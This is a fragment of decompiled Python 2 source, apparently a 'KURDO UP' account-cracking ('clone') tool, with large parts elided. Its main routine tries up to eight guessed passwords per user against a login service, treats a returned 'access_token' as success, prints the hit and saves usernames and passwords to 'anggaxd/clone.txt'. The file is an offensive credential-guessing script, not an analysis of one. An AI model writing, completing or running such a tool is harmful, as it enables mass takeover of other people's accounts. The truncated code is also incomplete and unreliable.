...
# Embedded file name: 976257004o.py
# Compiled at: 2021-03-29 15:57:21
...
os.system('clear')
logo = """                                                                     
\033[91m _  ___   _ ____  ____   ___    _   _ ____
\033[91m | |/ / | | |  _ \|  _ \ / _ \  | | | |  _ \
\033[33m | ' /| | | | |_) | | | | | | | | | | | |_) |
\033[33m | . \| |_| |  _ <| |_| | |_| | | |_| |  __/
 \033[92m|_|\_\\___/|_| \_\____/ \___/   \___/|_|
        """
logo2 = """                                                                     
\033[91m _  ___   _ ____  ____   ___    _   _ ____
\033[91m | |/ / | | |  _ \|  _ \ / _ \  | | | |  _ \
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[OK] ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        ...
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[GOOD] ' + k + c + user + '  \x1b[1;92m|  ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
